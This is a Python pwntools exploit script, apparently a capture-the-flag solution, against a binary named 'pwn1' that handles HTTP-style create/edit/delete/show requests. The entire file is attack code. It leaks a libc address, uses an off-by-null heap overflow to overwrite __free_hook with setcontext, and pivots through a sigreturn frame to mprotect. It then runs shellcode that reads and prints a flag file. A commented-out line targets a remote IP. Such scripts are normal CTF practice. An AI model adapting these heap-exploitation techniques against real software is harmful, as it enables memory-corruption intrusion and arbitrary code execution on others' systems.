from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

#----------------------------------------------

sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s)
ti = lambda : sh.interactive()

#----------------------------------------------

http_packet = '''GET /{} HTTP/1.1\r\n
Host: Epiphany\r\n
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n
Accept-Language: en-US,en;q=0.5\r\n
Accept-Encoding: gzip, deflate\r\n
Connection: close\r\n
Content-Length\r\n
'''
sh = process("./pwn1")
# sh = remote("10.75.1.22",'58012')
libc = ELF("./libc.so.6")
def login():
    http_packet = '''POST /login HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUsername: C4oy1\r\nPassword: 123\r\nContent-Length: {}\r\n\r\nUsername=C4oy1&Password=123\r\n'''.format(0x1e)
    sla("test> ", http_packet)
def add(c):
    http_packet = '''POST /create HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nContent-Length: {}\r\n\r\n{}'''.format(len(c)+1,c)
    sla("test> ", http_packet)
def edit(idx,c):
    http_packet = '''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: {}\r\nContent-Length: {}\r\n\r\n{}'''.format(idx,len(c),c)
    sa("test> ", http_packet)
def edit11(idx,c):
    http_packet = '''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: {}\r\nContent-Length: {}\r\n\r\n{}'''.format(idx,0x62,c)
    sa("test> ", http_packet)
def edit22(idx,c):
    http_packet = '''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: {}\r\nContent-Length: {}\r\n\r\n{}'''.format(idx,0x6,c)
    sa("test> ", http_packet)
def delete(idx):
    http_packet = '''POST /delete HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: {}\r\nContent-Length: 0\r\n\r\n'''.format(idx)
    sla("test> ", http_packet)
def show(idx):
    http_packet = '''POST /show HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: {}\r\nContent-Length: 0\r\n\r\n'''.format(idx)
    sla("test> ", http_packet)

def replace0(s):
    r = ''
    for i in s:
        if i == '\0':
            r += 'a'
        else:
            r += i
    return r

login()
'''
gdb.attach(sh, "b *$rebase(0x00000000000280C))
pause()
'''
add('a'*0x450)
add('b'*0xa0)
delete(0)

add('a'*0x450)
show(0)

libc_base = u64(ru('\x7f')[-6:].ljust(8,b'\0')) - 0x3ebca0
free_hook = libc_base + libc.sym['__free_hook']
set_context  = libc_base + libc.sym['setcontext'] + 53
mprotect = libc_base + libc.sym['mprotect']
print(hex(libc_base))

#off by null
add('a'*0x67)
add('a'*0x67)
add('a'*0xf7)
for i in range(8):
    add('a'*0xf7)
for i in range(7):
    delete(5+i)

for i in range(8):
        edit(3, 'b'*(0x68-i))
edit11(3, 'b'*0x60+p64(0x70*2+0x460+0xb0))

delete(0)

delete(4)

delete(1)
add('a'*0x450)

add('a'*0x20)

edit(1, p32(free_hook & 0xffffffff) + p16((free_hook >> 32) &0xffff))

add('a'*0xa0)
add('a'*0xa0)

edit(5, p32(set_context & 0xffffffff) + p16((set_context >> 32) &0xffff))
payload = p64(set_context) + p64(free_hook+0x10)
sig = SigreturnFrame()
sig.rdi = free_hook & (~0xfff)
sig.rsi = 0x2000
sig.rdx = 7
sig.rip = mprotect
sig.rsp = free_hook+0x10
shellcode = shellcraft.open('./flag',0)
shellcode += shellcraft.read(3,free_hook+0x200,0x50)
shellcode += shellcraft.write(1,free_hook+0x200,0x50)
sc = asm(shellcode)
payload = p64(set_context) + p64(free_hook+0x10) + str(sig)[0x10:] + sc
print()

sc_addr = free_hook + 0x28
# gdb.attach(sh, "b *$rebase(0x00000000000280C)\nc\n")
pause()
edit(5, 'a'*8+p32(mprotect & 0xffffffff) + p16((mprotect >> 32) &0xffff) +'a'*2 + p32(sc_addr & 0xffffffff) + p16((sc_addr >> 32) &0xffff)+'a'*0x12 + sc)
edit(5, 'a'*8+p32(mprotect & 0xffffffff) + p16((mprotect >> 32) &0xffff) +'a'*2 + p32(sc_addr & 0xffffffff) + p16((sc_addr >> 32) &0xffff)+'a')
edit(5, 'a'*8+p32(mprotect & 0xffffffff) + p16((mprotect >> 32) &0xffff) +'a'*2 + p32(sc_addr & 0xffffffff) + p16((sc_addr >> 32) &0xffff))
edit(5, 'a'*8+p32(mprotect & 0xffffffff) + p16((mprotect >> 32) &0xffff) +'a')
edit(5, 'a'*8+p32(mprotect & 0xffffffff) + p16((mprotect >> 32) &0xffff))
edit(5, 'a'*7)
edit(5, p32(set_context & 0xffffffff) + p16((set_context >> 32) &0xffff))


tmp = replace0(str(sig))
edit(0,tmp)
edit(0,tmp[:0xaf])
edit(0,tmp[:0xae])
edit(0,tmp[:0xa7])
edit(0,tmp[:0xa6])
for i in range(0x7):
    edit(0,tmp[:0x8f-i])
for i in range(0x6):
    edit(0,tmp[:0x77-i])

edit(0,tmp[:0x6f])
edit(0,tmp[:0x6e])
edit(0,tmp[:0x68])

'''
edit(0,tmp[:0x6f])
edit(0,tmp[:0x6e])
edit(0,tmp[:0x67])
edit(0,tmp[:0x66])
for i in range(0x6):
    edit(0,tmp[:0x5f-i])
for i in range(0x16):
    edit(0,tmp[:0x48-i])
for i in range(0x3):
    edit(0,tmp[:0x31-i])
for i in range(0x24):
    edit(0,tmp[:0x24-i])
'''
delete(0)
ti()